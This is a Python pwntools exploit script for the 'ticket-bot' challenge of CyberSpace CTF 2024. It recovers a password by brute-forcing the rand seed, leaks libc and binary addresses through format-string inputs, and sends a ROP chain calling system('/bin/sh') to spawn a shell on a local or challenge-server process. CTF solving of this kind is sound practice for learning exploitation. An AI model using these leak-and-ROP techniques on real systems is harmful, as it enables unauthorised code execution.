#!/usr/bin/env python3
from pwn import *
import ctypes
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/ticket-bot/chal')
TARGET_LIBC = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/ticket-bot/libc.so.6')
cdll = ctypes.CDLL(TARGET_LIBC)
elf = ELF(TARGET)
libc = ELF(TARGET_LIBC)

def find_password(r):
    r.recvuntil(b'ticketID ')

    ticket = int(r.recvline().strip())

    for i in range(10000000):
        cdll.srand(i)

        password = cdll.rand()

        if cdll.rand() == ticket:
            return password

def service_login(r, password):
    r.sendlineafter(b'Login\n========================\n', b'2')
    r.sendlineafter(b'Password\n', password)

def change_admin_password(r, password):
    r.sendlineafter(b'Tickets\n========================\n', b'1')
    r.sendlineafter(b'Password\n', password)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    password = find_password(r)

    service_login(r, b'0')
    change_admin_password(r, b'%p')
    r.recvuntil(b'to\n')

    libc.address = int(r.recvline().split(b'0x')[1].split(b'=')[0], 16) - (libc.sym._IO_2_1_stdout_ + 131)

    service_login(r, str(password).encode())
    change_admin_password(r, b'%9$p')
    r.recvuntil(b'to\n')

    elf.address = int(r.recvline().split(b'0x')[1].split(b'=')[0], 16) - (elf.sym.ServiceLogin + 71)

    rop = ROP(elf)

    rop.raw(str(0x01010101))
    rop.raw(cyclic(8))
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])

    service_login(r, b'0')
    change_admin_password(r, rop.chain())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('ticket-bot.challs.csc.tf', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
